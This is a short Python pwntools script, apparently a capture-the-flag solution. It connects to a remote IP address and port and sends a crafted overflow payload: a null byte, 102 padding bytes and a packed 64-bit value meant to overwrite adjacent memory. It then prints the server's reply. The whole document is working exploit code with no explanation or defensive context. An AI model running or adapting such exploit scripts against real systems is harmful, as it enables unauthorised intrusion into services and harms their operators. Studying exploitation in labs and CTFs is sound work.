from pwn import *
p = remote("103.226.138.119", 19005)
payload = b"A\x00" + b"B"*(102) + p64(1) + b"\n"
p.send(payload)
print(p.recvall(timeout=2).decode(errors='replace'))

